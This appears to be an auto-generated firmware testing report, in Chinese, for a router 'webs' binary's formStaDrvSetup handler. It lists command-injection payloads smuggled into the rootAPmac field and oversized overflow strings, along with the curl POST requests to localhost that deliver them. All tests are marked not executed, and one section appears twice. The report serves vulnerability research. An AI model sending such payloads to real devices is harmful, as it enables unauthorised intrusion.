# fwmap dyn · 动态验证

- 目标：`C:\deepseek\fw\p5\root\bin\webs`
- 架构 / 运行时：mipsel / 无（未执行）
- 端口：8080

> `no-listener` 表示服务没起来，**不是**「没有漏洞」；
> `no-crash` 表示打完了没崩，也不等于安全。

## `formStaDrvSetup` → system[ci]

| 载荷 | 结果 | 细节 |
|---|---|---|
| `rootAPmac` = `;id;` | 未执行 |  |
| `rootAPmac` = `'id'` | 未执行 |  |
| `rootAPmac` = `$(id)` | 未执行 |  |

```
curl -sS -X POST "http://127.0.0.1:8080/goform/formStaDrvSetup" -H "Host: 127.0.0.1:8080" -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "rootAPmac=%3Bid%3B"
```

## `formStaDrvSetup` → sprintf[bof]

| 载荷 | 结果 | 细节 |
|---|---|---|
| `rootAPmac` = `AAAAAAAAAAAAAA…（64B）` | 未执行 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（200B）` | 未执行 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（512B）` | 未执行 |  |

```
curl -sS -X POST "http://127.0.0.1:8080/goform/formStaDrvSetup" -H "Host: 127.0.0.1:8080" -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "rootAPmac=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

## `formStaDrvSetup` → sprintf[bof]

| 载荷 | 结果 | 细节 |
|---|---|---|
| `rootAPmac` = `AAAAAAAAAAAAAA…（64B）` | 未执行 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（200B）` | 未执行 |  |
| `rootAPmac` = `AAAAAAAAAAAAAA…（512B）` | 未执行 |  |

```
curl -sS -X POST "http://127.0.0.1:8080/goform/formStaDrvSetup" -H "Host: 127.0.0.1:8080" -H "Content-Type: application/x-www-form-urlencoded" -H "Connection: close" --data "rootAPmac=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
```

